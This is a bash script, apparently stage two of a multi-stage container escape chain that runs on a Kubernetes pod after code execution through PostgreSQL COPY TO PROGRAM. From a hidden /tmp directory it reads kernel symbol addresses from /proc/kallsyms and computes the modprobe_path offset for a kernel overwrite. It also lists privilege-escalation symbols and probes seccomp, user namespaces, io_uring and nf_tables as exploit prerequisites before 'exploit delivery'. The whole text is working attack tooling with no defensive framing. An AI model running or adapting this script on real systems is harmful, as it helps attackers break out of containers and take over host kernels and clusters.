#!/bin/bash
# Stage 2: Container Escape Deployment
# This script runs ON the K8s pod via COPY TO PROGRAM
# It extracts the MODPROBE_PATH_BASE offset and prepares the exploit

set -e
WORKDIR="/tmp/.x"
mkdir -p $WORKDIR
cd $WORKDIR

echo "[*] Stage 2: Extracting kernel symbols..."

# Extract key addresses from kallsyms
KBASE=$(grep -w "T _text" /proc/kallsyms 2>/dev/null | awk '{print $1}')
MODPROBE=$(grep -w "D modprobe_path" /proc/kallsyms 2>/dev/null | awk '{print $1}')

if [ -z "$KBASE" ] || [ -z "$MODPROBE" ]; then
    # Fallback: try alternative symbol names
    KBASE=$(grep -w "T startup_64" /proc/kallsyms 2>/dev/null | awk '{print $1}')
    MODPROBE=$(grep -w "d modprobe_path" /proc/kallsyms 2>/dev/null | awk '{print $1}')
fi

if [ -z "$KBASE" ] || [ -z "$MODPROBE" ]; then
    echo "[-] FAILED: Could not extract kernel symbols"
    echo "[-] kallsyms might be restricted or symbols not found"
    grep -i "modprobe" /proc/kallsyms 2>/dev/null | head -5
    grep -i "_text" /proc/kallsyms 2>/dev/null | head -5
    exit 1
fi

# Calculate offset
KBASE_DEC=$((16#$KBASE))
MODPROBE_DEC=$((16#$MODPROBE))
OFFSET=$((MODPROBE_DEC - KBASE_DEC))
OFFSET_HEX=$(printf "0x%x" $OFFSET)

echo "[+] Kernel base:     0x$KBASE"
echo "[+] modprobe_path:   0x$MODPROBE"
echo "[+] MODPROBE_PATH_BASE offset: $OFFSET_HEX"

# Also extract other useful symbols for verification
echo "[*] Additional symbols:"
grep -wE "T (commit_creds|prepare_kernel_cred|find_task_by_vpid|switch_task_namespaces)" /proc/kallsyms 2>/dev/null
grep -wE "[dD] (init_nsproxy|core_pattern)" /proc/kallsyms 2>/dev/null

# Check prerequisites
echo ""
echo "[*] Checking exploit prerequisites..."
echo -n "  Seccomp: "; cat /proc/self/status | grep Seccomp | awk '{print $2}'
echo -n "  User NS: "; unshare -U id 2>/dev/null && echo "OK" || echo "FAIL"
echo -n "  io_uring: "; perl -e 'use POSIX; my $r = syscall(425, 1, pack("x120")); print($r >= 0 ? "OK (fd=$r)\n" : "FAIL (errno=$!)\n");' 2>/dev/null || echo "SKIP"
echo -n "  nf_tables: "; cat /proc/net/nf_conntrack_count 2>/dev/null && echo " (nf_conntrack active)" || echo "checking..."
echo -n "  /tmp exec: "; cp /bin/true $WORKDIR/test_exec 2>/dev/null && chmod +x $WORKDIR/test_exec && $WORKDIR/test_exec && echo "OK" || echo "FAIL"

# Write offset to file for later use
echo "$OFFSET_HEX" > $WORKDIR/modprobe_offset.txt
echo "[+] Offset saved to $WORKDIR/modprobe_offset.txt"
echo "[+] Stage 2 complete. Ready for Stage 3 (exploit delivery)."
